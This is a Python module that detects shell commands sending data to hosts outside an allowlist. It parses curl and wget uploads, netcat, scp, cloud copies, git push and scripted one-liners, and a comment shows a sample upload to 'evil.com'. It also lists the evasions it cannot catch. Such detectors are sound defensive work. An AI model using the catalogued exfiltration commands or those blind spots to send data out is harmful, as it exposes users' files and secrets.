"""Heuristic detector for shell commands that send data to a non-allowlisted host.

Rule-based and intentionally narrow: it looks for common upload/exfiltration
primitives: curl/wget uploads, nc/socat, scp/rsync/sftp to a remote host, cloud copies
(aws s3 cp/sync, gsutil cp, rclone copy/sync to a remote), gh gist create, git push to a
URL, and python -c / node -e one-liners that call requests.post/put/patch, urllib,
http.client or fetch with a URL. It cannot catch obfuscated code, scripts in files,
heredocs, or a git push to a named remote whose URL is defined elsewhere.
Cloud destinations can be allowlisted as "s3://bucket", "gs://bucket" or "rclone:remote".

match="uploads" (default) flags only those upload primitives. match="any_host" (strict)
also flags any request by a known network client to a host not in allowed_hosts, GETs
included: curl, wget, httpie (http/https/xh), aria2c, ssh, telnet, ftp. Package managers,
git and scripted clients are not covered by either mode.
"""
import bisect
import re
import shlex
from typing import List
from urllib.parse import urlparse

from .findings import Finding

_SPLIT = re.compile(r"\|\||&&|;|\||\n")
_URL = re.compile(r"(?i)\b(?:https?|ftp|s3|sftp)://[^\s'\"<>]+")
_CURL_UPLOAD = re.compile(
    r"^(-d|-F|-T|--data|--data-raw|--data-binary|--data-urlencode|--form|--upload-file|--json)(=.*)?$")
_WGET_UPLOAD = re.compile(r"^--(post-data|post-file|body-data|body-file)(=.*)?$")
_REMOTE = re.compile(r"^(?:[\w.\-]+@)?([A-Za-z0-9][A-Za-z0-9.\-]*\.[A-Za-z]{2,}|\d{1,3}(?:\.\d{1,3}){3}):")
_WRAPPERS = {"sudo", "env", "nohup", "time", "command", "exec"}
MATCH_MODES = ("uploads", "any_host")

# Options whose NEXT token is a value, not a host (bare-host parsing).
_CURL_ARG_OPTS = set("-d -F -T -H -u -A -e -b -c -K -x -X -m -w -r -E -o -C -Y -y -z -U -D -Q -t".split()) | {
    "--data", "--data-raw", "--data-binary", "--data-urlencode", "--form", "--upload-file", "--json",
    "--header", "--user", "--user-agent", "--referer", "--cookie", "--cookie-jar", "--config", "--proxy",
    "--request", "--max-time", "--write-out", "--range", "--cert", "--output", "--continue-at",
    "--cacert", "--capath", "--key", "--connect-timeout", "--retry", "--resolve", "--interface",
    "--dump-header", "--oauth2-bearer", "--proxy-user", "--limit-rate", "--output-dir"}
_WGET_ARG_OPTS = set("-O -o -a -P -U -e -i -t -T -w -Q -l -A -R -D -I -X".split()) | {
    "--output-document", "--output-file", "--append-output", "--directory-prefix", "--user-agent",
    "--header", "--execute", "--input-file", "--tries", "--timeout", "--wait", "--quota", "--level",
    "--user", "--password", "--http-user", "--http-password", "--referer", "--post-data", "--post-file",
    "--body-data", "--body-file", "--method", "--load-cookies", "--save-cookies", "--ca-certificate"}
_SSH_ARG_OPTS = set("-b -c -D -E -e -F -I -i -J -L -l -m -O -o -p -Q -R -S -W -w".split())
_HTTPIE_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"}
_BARE_HOST = re.compile(r"^(?:[\w.\-]+@)?([A-Za-z0-9][A-Za-z0-9.\-]*\.[A-Za-z]{2,}|\d{1,3}(?:\.\d{1,3}){3})"
                        r"(?::\d+)?(?:/.*)?$")


def _host_allowed(host: str, allowed: List[str]) -> bool:
    host = host.lower().strip("[]")
    return any(host == a.lower() or host.endswith("." + a.lower()) for a in allowed)


_SHLEX_MAX = 65536   # shlex builds tokens char by char (quadratic in token length)
_WS = re.compile(r"[ \t\r\n]+")   # shlex's whitespace set (str.split also splits on \v, \f, NBSP...)


def _ws_split(segment: str) -> List[str]:
    return [t for t in _WS.split(segment) if t]


def _tokens(segment: str) -> List[str]:
    # Without quotes or backslashes, shlex.split (posix, no comments) == a split on shlex's
    # whitespace, which is linear. Huge quoted segments use that split too: approximate, but URLs
    # are matched on the raw segment, so hosts are still found.
    if len(segment) > _SHLEX_MAX or not any(c in segment for c in "'\"\\"):
        return _ws_split(segment)
    try:
        return shlex.split(segment)
    except ValueError:
        return segment.split()


_AWS_ARG_OPTS = {"--profile", "--region", "--endpoint-url", "--output", "--query", "--exclude",
                 "--include", "--acl", "--storage-class", "--sse", "--sse-kms-key-id", "--cache-control",
                 "--content-type", "--expires", "--grants", "--metadata", "--page-size", "--ca-bundle",
                 "--cli-read-timeout", "--cli-connect-timeout", "--color"}
_GSUTIL_ARG_OPTS = {"-h", "-o", "-p", "-u", "-z", "-x", "-a", "-s", "-j", "-I"}
_RCLONE_ARG_OPTS = {"--config", "--transfers", "--checkers", "--include", "--exclude", "--filter",
                    "--bwlimit", "--log-file", "--log-level", "--max-age", "--min-age", "--max-size",
                    "--min-size", "--backup-dir", "--suffix", "--drive-shared-with-me"}
_GIT_PUSH_ARG_OPTS = {"--repo", "--push-option", "-o", "--receive-pack", "--exec", "--recurse-submodules"}
_SCP_LIKE = re.compile(r"^(?:[\w.\-]+@)?([A-Za-z0-9][A-Za-z0-9.\-]*):(?!//)")    # git@host:org/repo
_RCLONE_REMOTE = re.compile(r"^([A-Za-z0-9_][A-Za-z0-9_.\- ]*):")                   # name:path
_ONE_LINER = re.compile(r"(?<![\w./-])(?:[\w.\-]{0,64}/){0,16}(python[0-9.]{0,6}|node|nodejs)\s+"
                        r"(?:-[A-Za-z]{1,8}\s+){0,8}?"
                        r"(-c|-e|-p|--eval|--print)\s*")
_NET_CALL = re.compile(r"requests\.(?:post|put|patch)\b|\burllib\b|\bhttp\.client\b|\bfetch\s*\(")


def _dest_allowed(scheme: str, name: str, allowed: List[str]) -> bool:
    want = f"{scheme}:{name}" if scheme == "rclone" else f"{scheme}://{name}"
    return any(a.lower().rstrip("/") == want.lower() for a in allowed)


def _quoted_arg(text: str, i: int) -> str:
    """The shell word starting at text[i]: a '...' or "..." string (unterminated = to the end),
    or a bare word. Used for -c/-e code, which may contain ; | & that split segments."""
    if i >= len(text):
        return ""
    q = text[i]
    if q == "'":
        j = text.find("'", i + 1)
        return text[i + 1:] if j < 0 else text[i + 1:j]
    if q == '"':
        out, j = [], i + 1
        while j < len(text) and text[j] != '"':
            if text[j] == "\\" and j + 1 < len(text):
                j += 1
            out.append(text[j])
            j += 1
        return "".join(out)
    m = re.match(r"\S+", text[i:])
    return m.group(0) if m else ""


def _one_liner_findings(text: str, allowed_hosts: List[str]) -> List[Finding]:
    out = []
    for m in _ONE_LINER.finditer(text):
        code = _quoted_arg(text, m.end())
        if not _NET_CALL.search(code):
            continue
        lang = "node" if m.group(1).startswith("node") else "python"
        for u in _URL.findall(code):
            h = urlparse(u).hostname or ""
            if h and not _host_allowed(h, allowed_hosts):
                out.append(Finding(
                    rule="network.upload",
                    reason=f"Command sends data via a {lang} one-liner network call to '{h}', "
                           "which is not in allowed_hosts.",
                    start=m.start(), end=min(len(text), m.end() + len(code) + 2), masked=h,
                    severity="high", replacement=None))
                break
    return out


def _positional(args: List[str], arg_opts: set) -> List[str]:
    """Non-option arguments, skipping the value of options that take one."""
    out, skip = [], False
    for a in args:
        if skip:
            skip = False
            continue
        if a.startswith("-"):
            skip = a in arg_opts            # "--opt=value" and "-ovalue" carry their value inline
            continue
        out.append(a)
    return out


def _request_hosts(seg: str, args: List[str], arg_opts: set) -> List[str]:
    """Hosts a client will contact: URL hosts, else bare host[:port][/path] arguments."""
    urls = [urlparse(u).hostname or "" for u in _URL.findall(seg)]
    if urls:
        return urls
    out = []
    for a in _positional(args, arg_opts):
        m = _BARE_HOST.match(a)
        if m:
            out.append(m.group(1))
    return out


def find_network_egress(text: str, allowed_hosts: List[str], match: str = "uploads") -> List[Finding]:
    strict = match == "any_host"
    findings: List[Finding] = _one_liner_findings(text, allowed_hosts)
    # "git remote add NAME URL" earlier in the same command lets "git push NAME" be resolved.
    # Each push uses the latest definition BEFORE it (a later redefinition must not hide it).
    alias_pos, alias_url = {}, {}          # name -> sorted positions / matching URLs
    for am in re.finditer(r"\bgit\s+remote\s+(?:add|set-url)\s+(?:-\S+\s+){0,8}([\w.\-]+)\s+(\S+)", text):
        alias_pos.setdefault(am.group(1), []).append(am.start())
        alias_url.setdefault(am.group(1), []).append(am.group(2).strip("'\";"))
    offset = 0
    for m in re.finditer(r"[^|;&\n]+|\|\||&&|;|\||\n", text):
        seg = m.group(0)
        if _SPLIT.fullmatch(seg) or not seg.strip():
            continue
        toks = _tokens(seg)
        while toks and (toks[0] in _WRAPPERS or re.match(r"^[A-Za-z_]\w*=", toks[0])):
            toks = toks[1:]
        if not toks:
            continue
        cmd = toks[0].split("/")[-1].lower()
        args = toks[1:]
        hosts: List[str] = []
        kind = None
        upload = True                       # False: strict-mode request that may not send data

        if cmd == "curl":
            posting = any(_CURL_UPLOAD.match(a) for a in args) or any(
                a.upper() in ("POST", "PUT", "PATCH") and i > 0 and args[i - 1] in ("-X", "--request")
                for i, a in enumerate(args))
            if posting:
                kind = "curl upload"
                # URL hosts, else bare hosts ("curl -d x evil.com"), skipping option values
                # so "-o out.json" is not read as a host.
                hosts = _request_hosts(seg, args, _CURL_ARG_OPTS)
            elif strict:
                kind = "curl request"
                upload = False
                hosts = _request_hosts(seg, args, _CURL_ARG_OPTS)
        elif cmd == "wget":
            if any(_WGET_UPLOAD.match(a) for a in args):
                kind = "wget upload"
                hosts = [urlparse(u).hostname or "" for u in _URL.findall(seg)]
            elif strict:
                kind = "wget request"
                upload = False
                hosts = _request_hosts(seg, args, _WGET_ARG_OPTS)
        elif cmd in ("nc", "ncat", "netcat", "socat"):
            kind = f"{cmd} connection"
            hosts = [a for a in args if re.match(r"^[A-Za-z0-9][A-Za-z0-9.\-]*$", a)
                     and not a.isdigit() and not a.startswith("-")][:1]
        elif cmd in ("scp", "rsync", "sftp"):
            for a in args:
                rm = _REMOTE.match(a)
                if rm:
                    kind = f"{cmd} to remote host"
                    hosts.append(rm.group(1))
        elif cmd == "aws":
            pos = _positional(args, _AWS_ARG_OPTS)
            if len(pos) >= 3 and pos[0] == "s3" and pos[1] in ("cp", "sync"):
                dest = pos[-1]
                if dest.lower().startswith("s3://") and not pos[-2].lower().startswith("s3://"):
                    bucket = dest[5:].split("/")[0]
                    if not _dest_allowed("s3", bucket, allowed_hosts):
                        kind, hosts = f"aws s3 {pos[1]} upload", [f"s3://{bucket}"]
        elif cmd == "gsutil":
            pos = _positional(args, _GSUTIL_ARG_OPTS)
            if len(pos) >= 3 and pos[0] in ("cp", "rsync", "mv"):
                dest = pos[-1]
                if dest.lower().startswith("gs://") and not any(p.lower().startswith("gs://") for p in pos[1:-1]):
                    bucket = dest[5:].split("/")[0]
                    if not _dest_allowed("gs", bucket, allowed_hosts):
                        kind, hosts = f"gsutil {pos[0]} upload", [f"gs://{bucket}"]
        elif cmd == "rclone":
            pos = _positional(args, _RCLONE_ARG_OPTS)
            if len(pos) >= 3 and pos[0] in ("copy", "sync", "move", "copyto", "moveto"):
                src, dest = pos[1], pos[-1]
                dm, sm = _RCLONE_REMOTE.match(dest), _RCLONE_REMOTE.match(src)
                if dm and not sm and not _dest_allowed("rclone", dm.group(1), allowed_hosts):
                    kind, hosts = f"rclone {pos[0]} upload", [f"{dm.group(1)}:"]
        elif cmd == "gh":
            pos = _positional(args, {"-d", "--desc", "--description", "-f", "--filename", "-R", "--repo"})
            if pos[:2] == ["gist", "create"]:
                kind, hosts = "gh gist create", ["gist.github.com"]
        elif cmd == "git":
            pos = _positional(args, {"-C", "-c", "--git-dir", "--work-tree"})
            if pos and pos[0] == "push":
                push = _positional(args[args.index("push") + 1:], _GIT_PUSH_ARG_OPTS)
                remote = push[0] if push else ""
                k = bisect.bisect_left(alias_pos.get(remote, []), m.start())
                url = alias_url[remote][k - 1] if k else remote
                if "://" in url:
                    h = urlparse(url).hostname or ""
                    if url.lower().startswith("file://"):
                        h = ""
                else:
                    sm = _SCP_LIKE.match(url)
                    h = sm.group(1) if sm and "." in sm.group(1) else ""
                if h:
                    kind, hosts = "git push", [h]
        elif strict and cmd in ("http", "https", "xh", "xhs"):
            kind = f"{cmd} request"
            upload = False
            hosts = _request_hosts(seg, [a for a in args if a not in _HTTPIE_METHODS], set())[:1]
        elif strict and cmd == "aria2c":
            kind = "aria2c download"
            upload = False
            hosts = [urlparse(u).hostname or "" for u in _URL.findall(seg)]
        elif strict and cmd in ("ssh", "telnet", "ftp"):
            pos = _positional(args, _SSH_ARG_OPTS if cmd == "ssh" else set())
            if pos:
                kind, upload = f"{cmd} connection", False
                hosts = [pos[0].rsplit("@", 1)[-1]]

        for h in hosts:
            cloud = h.startswith(("s3://", "gs://")) or h.endswith(":")
            if h and (cloud or not _host_allowed(h, allowed_hosts)):
                findings.append(Finding(
                    rule="network.upload" if upload else "network.connect",
                    reason=(f"Command sends data via {kind} to '{h}', which is not in allowed_hosts."
                            if upload else
                            f"Command contacts '{h}' via {kind}, which is not in allowed_hosts "
                            "(strict network mode)."),
                    start=m.start(), end=m.end(), masked=h, severity="high", replacement=None))
                break
    return findings
